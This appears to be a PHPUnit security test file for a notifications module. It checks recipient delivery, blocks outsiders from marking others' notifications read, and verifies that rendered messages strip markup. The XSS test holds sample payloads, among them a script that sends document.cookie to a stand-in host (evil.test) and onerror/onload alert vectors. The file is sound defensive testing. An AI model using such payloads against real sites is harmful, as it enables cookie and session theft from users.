<?php
use PHPUnit\Framework\TestCase;

/**
 * Arm B — MOD-07 Notifications. Budget: 4.
 * Functional: FR-07.1..07.3. Properties: SP-04, SP-05.
 * n/a: SP-01,02,03,06,07,08,09,10,11,12.
 */
final class Mod07NotificationsArmBTest extends TestCase {

    private array $fx = [];

    protected function setUp(): void { TestSupport::resetDefects(); }

    protected function tearDown(): void {
        foreach ($this->fx as $ids) TestSupport::dropApplication($ids);
        $this->fx = [];
    }

    private function user(): array {
        $ids = TestSupport::makeApplication();
        $this->fx[] = $ids;
        return $ids;
    }

    /** FR-07.1 */
    public function testNotificationReachesItsRecipient(): void {
        $a = $this->user();
        $m = new NotificationModel();
        $m->create($a['user_id'], 'Status Changed', 'Your application moved to Officer Review.');
        $this->assertCount(1, $m->getByUser($a['user_id']));
    }

    // ── SP-04 Object access is scoped to the principal ────────

    /**
     * SP-04 / FR-07.2 — notification ids are sequential and guessable. Mutation
     * must be refused for anyone who is not the recipient.
     */
    public function testANotificationCannotBeMutatedByANonRecipient(): void {
        $owner     = $this->user();
        $outsider  = $this->user();
        $m = new NotificationModel();

        $id = $m->create($owner['user_id'], 'Status Changed', 'Private update.');
        $m->markRead($id, $outsider['user_id']);

        $this->assertSame(1, $m->countUnread($owner['user_id']),
            "an outsider marked another user's notification read");
    }

    /** SP-04 / FR-07.1 — one recipient's list must not contain another's items */
    public function testRecipientListsDoNotOverlap(): void {
        $a = $this->user();
        $b = $this->user();
        $m = new NotificationModel();
        $m->create($a['user_id'], 'A', 'for a');
        $m->create($b['user_id'], 'B', 'for b');

        foreach ($m->getByUser($a['user_id']) as $row) {
            $this->assertSame($a['user_id'], (int)$row['recipient_user_id']);
        }
    }

    // ── SP-05 Untrusted text does not reach an interpreter ────

    /**
     * SP-05 / FR-07.3 — notification bodies embed applicant- and officer-supplied
     * text and are rendered into HTML. Markup in a body must not become markup.
     */
    public function testStoredMessageContentCannotBecomeMarkup(): void {
        $payloads = [
            '<script>fetch("//evil.test?c="+document.cookie)</script>',
            '<img src=x onerror="alert(1)">',
            '"><svg/onload=alert(1)>',
        ];
        foreach ($payloads as $p) {
            $rendered = NotificationModel::renderMessage("Case update: $p");
            $this->assertStringNotContainsString('<script', $rendered, "script survived: $p");
            $this->assertStringNotContainsString('<img',    $rendered, "img survived: $p");
            $this->assertStringNotContainsString('<svg',    $rendered, "svg survived: $p");
        }
    }
}
